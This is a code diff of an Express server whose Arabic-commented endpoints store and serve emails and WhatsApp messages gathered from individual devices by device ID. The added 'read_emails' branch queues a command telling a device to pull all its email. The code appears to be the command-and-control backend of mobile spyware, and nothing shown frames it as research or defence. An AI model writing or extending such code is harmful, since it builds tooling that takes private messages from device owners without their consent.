@@ -106,7 +106,6 @@ app.post('/upload.php', (req, res) => {
             let emails = [];
             if (fs.existsSync(emailFile)) emails = JSON.parse(fs.readFileSync(emailFile, 'utf8'));
             
-            // ✅ الجديد فوق القديم
             emails.unshift({
                 app_name: data.app_name || 'Email',
                 package_name: data.package_name || '',
@@ -296,6 +295,18 @@ app.get('/api.php', (req, res) => {
             const waFile = path.join(dataDir, deviceId, 'whatsapp_messages.json');
             if (fs.existsSync(waFile)) return res.json(JSON.parse(fs.readFileSync(waFile, 'utf8')));
             return res.json([]);
+        }
+        
+        // ✅ أمر سحب كل البريد
+        if (action === 'read_emails') {
+            const deviceDir = path.join(dataDir, deviceId);
+            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
+            const commandsFile = path.join(deviceDir, 'commands.json');
+            let commands = [];
+            if (fs.existsSync(commandsFile)) commands = JSON.parse(fs.readFileSync(commandsFile, 'utf8'));
+            commands.push({ command: 'read_emails', timestamp: Math.floor(Date.now()/1000), status: 'pending' });
+            fs.writeFileSync(commandsFile, JSON.stringify(commands));
+            return res.json({ success: true });
         }
         
         // ✅ استرجاع رسائل البريد
